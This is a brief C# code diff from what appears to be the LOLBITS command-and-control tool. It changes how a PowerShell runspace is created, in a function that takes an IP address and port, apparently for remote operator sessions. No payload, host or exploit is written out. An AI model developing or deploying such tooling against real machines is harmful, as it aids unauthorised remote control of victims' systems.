@@ -22,9 +22,9 @@ namespace LOLBITS.Controlling
             var a = (object[])args;
             var ip = (string)a[0];
             var port = (string)a[1];
-            var instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
-            
-            using (var rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
+
+            RunspaceConfiguration rspace = RunspaceConfiguration.Create();
+            using(Runspace rs = RunspaceFactory.CreateRunspace(rspace))
             {
                 rs.Open();
 
